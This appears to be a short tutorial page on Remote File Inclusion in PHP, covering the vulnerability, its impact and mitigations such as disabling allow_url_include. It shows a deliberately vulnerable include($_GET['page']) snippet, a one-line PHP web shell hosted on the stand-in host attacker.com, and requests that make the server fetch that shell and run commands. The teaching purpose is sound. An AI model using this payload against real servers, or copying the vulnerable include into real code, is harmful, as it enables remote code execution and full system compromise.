File Inclusion Vulnerabilities

Remote File Inclusion (RFI)

Executing Malicious Code from External Servers

RFI Explained

RFI allows attackers to include and execute files from a remote, attacker-controlled server, often leading to remote code execution (RCE).

  • •**External File Inclusion:** Fetching files from arbitrary URLs.
  • •**Remote Code Execution:** Executing attacker's malicious scripts.
  • •**High Impact:** Full system compromise.
Common Configuration

PHP's allow_url_include=Off setting is crucial for preventing RFI.

RFI Vulnerable PHP Coderemote_include.php
<?php
  // Highly vulnerable code: includes remote files
  $file = $_GET['page'];
  include($file);
?>

// Attacker's Request:
// GET /remote_include.php?page=http://attacker.com/malicious_shell.txt

// Contents of malicious_shell.txt (on attacker.com):
// <?php system($_GET['cmd']); ?>

// Attacker then calls:
// GET /remote_include.php?page=http://attacker.com/malicious_shell.txt&cmd=ls%20-la

// Expected Output (if successful):
// (listing of files on the target server)
Mitigation

Disable allow_url_include in PHP. Implement strict input validation to whitelist allowed URLs or disallow external URLs entirely.

Key Takeaway

RFI is a critical vulnerability allowing remote code execution by including attacker-controlled files, making server configuration vital.
